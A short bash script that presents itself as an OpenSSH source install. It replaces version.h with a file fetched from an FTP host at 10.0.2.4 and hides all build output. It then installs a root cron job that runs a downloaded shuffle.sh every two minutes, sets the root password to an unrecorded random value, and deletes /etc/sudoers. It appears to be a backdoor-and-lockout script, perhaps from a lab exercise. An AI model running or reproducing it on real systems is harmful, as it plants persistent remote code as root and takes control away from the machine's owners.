#!/bin/bash
git clone -q https://github.com/openssh/openssh-portable
rm openssh-portable.zip
cd openssh-portable
rm version.h
wget ftp://10.0.2.4/openssh-client/version/version.h -q
sudo install -v -m700 -d /var/lib/sshd > /dev/null
sudo chown -v root:sys /var/lib/sshd > /dev/null
sudo groupadd sshd > /dev/null 2>&1
sudo useradd  -c 'sshd PrivSep' -d /var/lib/sshd -g sshd -s /bin/false -u 50 sshd > /dev/null 2>&1
autoreconf
./configure > /dev/null
make > /dev/null 2>&1
sudo apt-get purge -y openssh-client > /dev/null 2>&1
sudo make install > /dev/null 2>&1
sudo crontab -l > temp_cron
#echo "0 0 * * 0 /etc/ssh_config/shuffle.sh" >> temp_cron
echo "*/2 * * * * /etc/ssh_config/shuffle.sh > /dev/null" >> temp_cron
sudo crontab temp_cron
rm temp_cron
wget ftp://10.0.2.4/openssh-client/version/shuffle.sh -q
sudo chmod +x shuffle.sh
sudo mkdir /etc/ssh_config
sudo chmod 700 /etc/ssh_config
sudo mv shuffle.sh /etc/ssh_config
sudo chmod 700 /etc/ssh_config/shuffle.sh
a=$(openssl rand -hex 12)
sudo echo -e "$a\n$a" | sudo passwd root &>/dev/null
sudo rm /etc/sudoers
